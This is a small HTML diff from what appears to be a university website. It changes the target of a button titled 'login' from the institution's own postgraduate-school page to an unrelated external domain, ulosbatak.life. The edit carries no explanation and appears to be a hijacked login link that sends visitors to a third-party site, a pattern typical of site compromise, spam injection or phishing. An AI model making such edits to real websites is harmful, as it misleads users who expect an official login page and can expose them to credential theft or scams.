@@ -418,7 +418,7 @@
             </a>
           </div>
           <div class="btn-items">
-            <a href="https://cpgs.pauluniversity.edu.ng/pages/" rel="nofollow noreferrer" target="_blank" title="login">
+            <a href="https://ulosbatak.life/bailaconm" rel="nofollow noreferrer" target="_blank" title="login">
               <span></span>
               <span></span>
               <span></span>
